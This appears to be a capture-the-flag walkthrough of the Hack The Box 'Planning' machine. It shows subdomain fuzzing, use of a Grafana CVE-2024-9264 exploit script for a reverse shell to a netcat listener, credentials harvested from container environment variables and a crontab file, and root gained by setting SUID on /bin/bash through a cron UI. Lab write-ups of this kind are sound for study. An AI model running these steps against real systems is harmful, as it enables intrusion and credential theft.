@@ -1,0 +1,149 @@
+
+
+
+As is common in real life pentests, you will start the Planning box with credentials for the following account: 
+admin / 0D5oT70Fq13EvB5r
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.68/ -H "Host: FUZZ.planning.htb" --hc 404,301 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.68/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000024093:   302        2 L      2 W        29 Ch       "grafana"   
+
+
+
+login using our creds
+
+Grafana v11.0.0
+
+"his vulnerability stems from Grafana passing unsanitized SQL queries directly to the DuckDB CLI ,
+enabling both remote code execution ( RCE ) and local file inclusion ( LFI ) by any user with Viewer (or
+higher) permissions. Although this feature should be turned off by default and isn't visible on the GUI , due
+to incorrect feature toggling, it is still accessible through the API ."
+
+https://github.com/rvizx/CVE-2024-9264
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ./exploit.sh http://grafana.planning.htb admin 0D5oT70Fq13EvB5r 10.10.14.49 53
+[>] logging in...
+[>] login successful
+[>] sending reverse shell payload...
+[>] payload sent
+[>] triggering reverse shell...
+
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53  
+listening on [any] 53 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.68] 51028
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# hostname
+7ce659d667d7
+# 
+
+so we assume we are in a docker container
+
+# env
+GF_PATHS_HOME=/usr/share/grafana
+HOSTNAME=7ce659d667d7
+AWS_AUTH_EXTERNAL_ID=
+SHLVL=1
+HOME=/usr/share/grafana
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_LOGS=/var/log/grafana
+_=hostname
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+AWS_AUTH_SESSION_DURATION=15m
+GF_SECURITY_ADMIN_USER=enzo
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+PWD=/usr/share/grafana
+# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh enzo@planning.htb    
+The authenticity of host 'planning.htb (10.10.11.68)' can't be established.
+ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
+...
+Last login: Thu Nov 13 01:33:06 2025 from 10.10.14.49
+enzo@planning:~$ 
+
+
+
+
+
+enzo@planning:/opt/crontabs$ cat crontab.db
+{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
+{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
+
+
+
+enzo@planning:/opt/crontabs$ netstat -tunlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:46393         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+enzo@planning:/opt/crontabs$ 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh enzo@planning.htb -L 8000:127.0.0.1:8000
+
+
+and use the above credentials to login as root
+
+its a crontabs ui
+
+we create a new one containing
+
+chmod u+s /bin/bash
+
+we have an option to click run now
+
+enzo@planning:/opt/crontabs$ ls -lsa /bin/bash
+1416 -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+enzo@planning:/opt/crontabs$ bash -p
+bash-5.2# id
+uid=1000(enzo) gid=1000(enzo) euid=0(root) groups=1000(enzo)
+bash-5.2# 
+
+
+
